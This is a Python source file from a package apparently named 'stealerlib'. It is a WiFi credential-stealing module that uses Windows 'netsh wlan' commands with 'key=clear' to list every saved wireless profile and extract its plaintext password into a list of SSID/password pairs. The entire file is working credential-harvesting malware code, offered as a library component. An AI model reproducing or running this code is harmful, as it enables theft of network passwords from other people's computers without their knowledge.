#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/wifi/__init__.py
"""

import subprocess

from dataclasses import dataclass

from stealerlib.exceptions import catch

from stealerlib.wifi.types import WiFiTypes


class WiFi:
    """This class provides methods for extracting and parsing information from connected WiFi stations

    Attributes:
        ssids           List of Parsed WiFi SSID's
        passwords       List of Parsed WiFi Passwords
        credentials     A list of tuples containing the WiFi's SSID and password (if parsed)
    """

    def __init__(self):
        self.ssids = []
        self.passwords = []
        self.credentials = []

    @catch
    @staticmethod
    def get_wifi_profiles() -> list[str]:
        """Retrieves all wifi profiles from the system -- Not implemented into get_wifi_passwords yet

        Parameters:
            None

        Returns:
            list[str]: A list of all wifi profile names
        """

        command_arguments = ['netsh', 'wlan', 'show', 'profiles']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        profiles = [
            p.split(":")[1][1:-1] for p in command_data if "All User Profile" in p
        ]

        return profiles

    @catch
    @staticmethod
    def get_profile_info(profile: str) -> list[str]:
        """Retrieves wifi profile information for a given profile name -- Not implemented into get_wifi_passwords yet

        Parameters:
            profile (str): The name of the wifi profile

        Returns:
            list[str]: A list of the profile information
        """

        command_arguments = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        info = [
            p.split(":")[1][1:-1] for p in command_data if "Key Content" in p
        ]

        return info

    @catch
    def get_wifi_passwords(self, conv: bool=True) -> list[WiFiTypes.SSID]:
        """Gets all wifi profiles and their passwords from the system

        Parameters:
            self (object): The object passed to the method
            conv (bool): Whether to return the data as a list of information or a StealerLib object

        Returns:
            None

        Example:
            network = WiFi()
            network.get_passwords()
        """

        command_arguments = ['netsh', 'wlan', 'show', 'profiles']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        profiles = [
            p.split(":")[1][1:-1] for p in command_data if "All User Profile" in p
        ]

        for profile in profiles:
            try:
                command_arguments = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                command_data = subprocess.check_output(command_arguments)
                command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

                profile_info = [
                    p.split(":")[1][1:-1] for p in command_data if "Key Content" in p
                ]

                try:
                    password = profile_info[0]
                except IndexError:
                    password = "No Password"
            except subprocess.CalledProcessError:
                password = "Encoding Error"

            obj_ssid = WiFiTypes.SSID(profile, password)

            self.ssids.append(obj_ssid.profile)
            self.passwords.append(obj_ssid.password)
            self.credentials.append(
                obj_ssid.conv() if conv else obj_ssid
            )

        return self.credentials